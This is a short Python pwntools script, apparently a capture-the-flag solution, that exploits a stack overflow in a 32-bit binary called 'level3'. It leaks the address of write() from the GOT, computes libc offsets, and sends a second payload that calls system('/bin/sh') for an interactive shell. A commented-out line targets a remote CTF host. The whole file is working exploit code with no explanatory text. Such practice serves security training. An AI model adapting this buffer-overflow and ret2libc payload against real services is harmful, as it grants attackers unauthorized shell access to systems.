from pwn import *

# libc = ELF('./libc_32.so.6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libcwriteaddr = libc.symbols['write'] # 0xf2010
libcsysaddr = libc.symbols['system']  # 0x45040
elf = ELF('./level3')
# io = remote('111.200.241.244', 61504)
io = process('./level3')
io.recv()
payload = cyclic(140) + p32(elf.plt['write']) + p32(elf.symbols['vulnerable_function']) + p32(1) + p32(elf.got['write']) + p32(4)
io.send(payload)
memwriteaddr = u32(io.recv()[0:4])
offset = memwriteaddr - libcwriteaddr
memsysaddr = offset + libcsysaddr
bin_sh = offset + next(libc.search(b'/bin/sh'))
payload2 = cyclic(140) + p32(memsysaddr) + p32(0xdeadbeef) + p32(bin_sh)
io.send(payload2)
io.interactive()